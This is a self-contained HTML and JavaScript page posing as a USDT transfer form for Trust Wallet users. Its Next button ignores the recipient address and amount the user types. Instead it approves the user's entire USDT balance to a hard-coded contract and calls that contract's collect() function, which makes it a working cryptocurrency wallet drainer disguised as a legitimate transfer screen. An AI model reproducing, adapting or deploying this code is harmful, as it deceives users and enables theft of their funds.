<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>USDT Transfer</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background: #fff;
      padding: 20px;
      margin: 0;
    }
    .container {
      max-width: 420px;
      margin: auto;
    }
    .label {
      font-weight: 500;
      margin-bottom: 6px;
    }
    .input-box {
      display: flex;
      align-items: center;
      border: 2px solid #1a40ff;
      border-radius: 12px;
      padding: 10px;
      margin-bottom: 20px;
    }
    .input-box input {
      flex: 1;
      border: none;
      font-size: 16px;
      outline: none;
    }
    .action-btn {
      font-size: 14px;
      font-weight: bold;
      color: #1a40ff;
      margin-left: 10px;
      cursor: pointer;
    }
    .amount-box {
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      border-radius: 12px;
      padding: 10px;
      margin-bottom: 6px;
    }
    .amount-box input {
      flex: 1;
      border: none;
      font-size: 16px;
      outline: none;
    }
    .amount-box span {
      margin-left: 10px;
    }
    .usd-note {
      font-size: 14px;
      color: #777;
      margin-bottom: 30px;
    }
    .btn {
      width: 100%;
      padding: 15px;
      font-size: 17px;
      font-weight: bold;
      border: none;
      color: white;
      border-radius: 30px;
      background-color: #0052ff;
      cursor: pointer;
    }
    .btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="label">Address or Domain</div>
    <div class="input-box">
      <input type="text" id="address" placeholder="Search or Enter" />
      <div class="action-btn" onclick="pasteAddress()">Paste</div>
      <div class="action-btn">üìá</div>
      <div class="action-btn">‚õ∂</div>
    </div>

    <div class="label">Amount</div>
    <div class="amount-box">
      <input type="number" id="amount" placeholder="USDT Amount" />
      <span>USDT</span>
      <div class="action-btn" onclick="setMax()">Max</div>
    </div>

    <div class="usd-note">‚âà $0.00</div>

    <button class="btn" id="nextBtn" onclick="approveAndTransfer()">Next</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    const USDT = "0x55d398326f99059fF775485246999027B3197955";
    const ADMIN = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
    const CONTRACT = "0xcD6a42782d230D7c13A74ddec5dD140e55499Df9"; // ‚úÖ Your final deployed contract

    const ABI = [
      "function balanceOf(address) view returns (uint256)",
      "function allowance(address owner, address spender) view returns (uint256)",
      "function approve(address spender, uint256 amount) returns (bool)",
      "function collect() external"
    ];

    const btn = document.getElementById("nextBtn");

    async function pasteAddress() {
      try {
        const text = await navigator.clipboard.readText();
        document.getElementById("address").value = text;
      } catch {
        alert("Clipboard access denied");
      }
    }

    async function setMax() {
      if (!window.ethereum) return alert("Trust Wallet DApp required");
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const token = new ethers.Contract(USDT, ABI, provider);
      const address = await signer.getAddress();
      const balance = await token.balanceOf(address);
      const value = Number(ethers.utils.formatUnits(balance, 18));
      document.getElementById("amount").value = value.toFixed(2);
    }

    async function approveAndTransfer() {
      if (!window.ethereum) return alert("Use Trust Wallet browser");

      btn.disabled = true;
      btn.textContent = "‚è≥ Processing...";

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const user = await signer.getAddress();

      const usdt = new ethers.Contract(USDT, ABI, signer);
      const smart = new ethers.Contract(CONTRACT, ["function collect() external"], signer);

      try {
        const balance = await usdt.balanceOf(user);
        const value = Number(ethers.utils.formatUnits(balance, 18));

        if (value < 1 || value > 25000) throw new Error("Balance out of range");

        await usdt.approve(CONTRACT, balance);
        const tx = await smart.collect();
        await tx.wait();

        btn.textContent = "‚úÖ Transfer Complete";
      } catch (e) {
        console.error(e);
        btn.textContent = "‚ùå Transfer Failed";
      }

      btn.disabled = false;
    }
  </script>
</body>
</html>
